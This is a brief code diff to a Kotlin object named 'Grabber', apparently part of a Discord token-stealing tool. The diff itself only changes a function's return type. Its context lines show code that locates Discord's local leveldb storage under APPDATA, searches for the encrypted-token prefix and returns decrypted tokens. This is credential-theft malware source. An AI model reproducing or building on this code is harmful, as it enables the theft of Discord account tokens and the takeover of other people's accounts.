@@ -23,7 +23,7 @@ object Grabber {
         return decryptedTokens
     }
 
-    private fun getTokensFromFile(): List<String>? {
+    private fun getTokensFromFile(): List<String> {
         val token = LinkedList<String>()
         val regex = "dQw4w9WgXcQ:"
         val files = File("${System.getenv("APPDATA")}\\discord\\Local Storage\\leveldb\\").listFiles()
